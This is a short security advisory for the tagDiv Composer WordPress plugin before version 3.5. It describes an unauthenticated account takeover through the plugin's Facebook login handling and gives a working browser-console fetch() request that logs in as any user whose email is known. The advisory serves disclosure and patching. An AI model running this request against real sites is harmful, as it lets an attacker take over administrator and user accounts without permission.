## WordPress Plugin Vulnerabilities

# tagDiv Composer < 3.5 - Unauthenticated Account Takeover

### Description

The plugin, required by the themes, does not properly implement the Facebook login feature, allowing unauthenticated attackers to login as any user by just knowing their email address

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as an unauthenticated user
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": 'action=td\_ajax\_fb\_login\_user&user[email]=admin@site.com',
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
Then refresh the page to be logged in as the user with the admin@site.com email address
